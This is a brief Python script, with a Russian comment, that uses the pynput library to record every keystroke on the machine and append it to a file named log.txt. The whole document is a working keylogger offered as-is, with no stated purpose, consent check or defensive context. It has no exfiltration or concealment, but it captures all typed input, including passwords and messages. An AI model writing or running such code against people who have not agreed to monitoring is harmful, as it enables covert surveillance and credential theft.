# pip3 install pynput
from pynput.keyboard import Listener

def writetofile(key):
  keydata = str(key)
  keydata = keydata.replace("'","")
  with open("log.txt","a") as f:
    f.write(keydata)

# эта функция для записи нажатой клавиши и сохранения ее как log.txt

with Listener(on_press =writetofile) as l:
  l.join()    